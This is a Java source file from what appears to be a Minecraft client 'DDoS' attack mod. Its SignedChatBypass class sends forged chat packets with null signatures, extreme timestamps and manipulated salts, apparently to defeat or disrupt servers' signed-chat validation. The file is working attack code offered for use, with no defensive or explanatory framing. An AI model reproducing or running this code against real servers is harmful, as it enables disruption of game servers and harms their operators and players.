package com.ddosclient.attack.attacks;

import net.minecraft.client.MinecraftClient;
import net.minecraft.network.message.LastSeenMessageList;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;

import java.time.Instant;
import java.util.BitSet;

public class SignedChatBypass extends BaseAttack {
    private long fakeSalt = 0;

    @Override
    public void execute(MinecraftClient mc) {
        if (mc.getNetworkHandler() == null) return;
        LastSeenMessageList.Acknowledgment ack =
            new LastSeenMessageList.Acknowledgment(BitSet.valueOf(new long[0]), 0);

        mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(
            "bypass",
            Instant.ofEpochMilli(0),
            fakeSalt++,
            null,
            ack
        ));
        mc.getNetworkHandler().sendPacket(new ChatMessageC2SPacket(
            " ",
            Instant.ofEpochMilli(Long.MAX_VALUE),
            -fakeSalt,
            null,
            ack
        ));
    }
}
